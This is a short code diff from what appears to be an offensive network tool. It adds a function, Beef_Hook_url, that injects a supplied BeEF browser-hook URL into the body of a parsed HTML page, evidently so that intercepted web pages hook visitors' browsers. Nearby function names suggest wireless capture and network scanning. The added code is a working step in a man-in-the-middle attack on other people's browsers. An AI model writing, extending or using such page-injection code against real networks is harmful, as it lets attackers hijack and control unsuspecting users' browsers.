@@ -33,6 +33,16 @@ def airdump_start(interface):
     process.join()
     return None
 
+def Beef_Hook_url(soup,hook_url):
+    try:
+        for link_tag in soup.findAll('body'):
+            link_tag_idx = link_tag.parent.contents.index(link_tag)
+            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
+            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
+            return soup
+    except NameError:
+        print('[-] please. your need install the module python-BeautifulSoup')
+
 def get_network_scan():
     list_scan = []
     try:
